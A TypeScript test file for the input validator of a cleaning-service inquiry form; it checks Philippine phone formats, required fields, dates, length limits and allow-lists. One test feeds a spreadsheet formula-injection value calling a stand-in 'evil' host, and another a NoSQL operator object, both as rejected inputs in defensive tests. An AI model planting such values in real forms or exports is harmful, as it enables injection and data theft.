import { test } from "node:test";
import assert from "node:assert/strict";
import { validateInquiry, LIMITS } from "../src/lib/validate.ts";

const valid = {
  name: "Juan Dela Cruz",
  phone: "0917 123 4567",
  email: "Juan@Example.com",
  service: "Deep Cleaning",
  propertyType: "Condo / Apartment",
  propertySize: "2 bedrooms, about 45 sqm",
  address: "12 Lacson St, Brgy. Mandalagan, Bacolod City",
  preferredDate: "2026-10-10",
  preferredTime: "Morning",
  message: "Please focus on the kitchen and bathrooms.",
};

test("accepts a complete inquiry and normalizes it", () => {
  const { valid: ok, values, errors } = validateInquiry(valid, { today: "2026-10-06" });
  assert.deepEqual(errors, {});
  assert.ok(ok);
  assert.equal(values.phone, "09171234567");
  assert.equal(values.email, "juan@example.com");
});

test("requires name, phone, service, property type and address", () => {
  const { errors } = validateInquiry({});
  assert.deepEqual(Object.keys(errors).sort(), ["address", "name", "phone", "propertyType", "service"]);
  assert.equal(errors.name, "Please enter your full name.");
  assert.equal(errors.address, "Please enter the address of the place to be cleaned.");
});

test("size, email, date and time are optional", () => {
  const minimal = { name: "Ana Reyes", phone: "09171234567", service: "House Cleaning", propertyType: "House", address: "5 Rizal St, Bacolod" };
  assert.ok(validateInquiry(minimal).valid);
});

test("accepts Philippine mobile and landline formats", () => {
  for (const phone of ["09171234567", "+63 917 123 4567", "639171234567", "(034) 433-1234", "034 433 1234"]) {
    assert.equal(validateInquiry({ ...valid, phone }).errors.phone, undefined, phone);
  }
});

test("rejects malformed phone numbers", () => {
  for (const phone of ["12345", "0917123456789", "abc", "+1 415 555 0100", "0917-ABC-4567"]) {
    assert.ok(validateInquiry({ ...valid, phone }).errors.phone, phone);
  }
});

test("email is optional but must be valid when given", () => {
  assert.equal(validateInquiry({ ...valid, email: "" }).errors.email, undefined);
  assert.ok(validateInquiry({ ...valid, email: "not-an-email" }).errors.email);
});

test("address is always required and must be more than a few characters", () => {
  assert.ok(validateInquiry({ ...valid, address: "" }).errors.address);
  assert.ok(validateInquiry({ ...valid, address: "abc" }).errors.address);
  assert.equal(validateInquiry({ ...valid, address: "12 Rizal St" }).errors.address, undefined);
});

test("rejects past and impossible dates", () => {
  assert.ok(validateInquiry({ ...valid, preferredDate: "2026-10-05" }, { today: "2026-10-06" }).errors.preferredDate);
  assert.ok(validateInquiry({ ...valid, preferredDate: "2026-02-30" }).errors.preferredDate);
  assert.ok(validateInquiry({ ...valid, preferredDate: "next week" }).errors.preferredDate);
});

test("enforces length limits", () => {
  const { errors } = validateInquiry({ ...valid, message: "x".repeat(LIMITS.message + 1) });
  assert.match(errors.message ?? "", /1000 characters/);
});

test("server allow-lists reject tampered options", () => {
  const allowed = { service: ["Deep Cleaning"], propertyType: ["House", "Condo / Apartment"], preferredTime: ["Morning"] };
  const { errors } = validateInquiry(
    { ...valid, service: "=IMPORTXML(\"http://evil\")", propertyType: "Castle", preferredTime: "3am" },
    { allowed },
  );
  assert.ok(errors.service && errors.propertyType && errors.preferredTime);
});

test("drops unknown keys, such as the old laundry fields", () => {
  const { values } = validateInquiry({ ...valid, serviceType: "Pickup", amount: "3 bags", secret: "x" });
  assert.deepEqual(Object.keys(values).sort(), [
    "address", "email", "message", "name", "phone", "preferredDate", "preferredTime", "propertySize", "propertyType", "service",
  ]);
});

test("ignores non-string input and strips control characters", () => {
  const { values, errors } = validateInquiry({ ...valid, name: { $ne: 1 } as unknown as string, message: "hi\u0000there\u0007" });
  assert.ok(errors.name);
  assert.equal(values.message, "hithere");
});
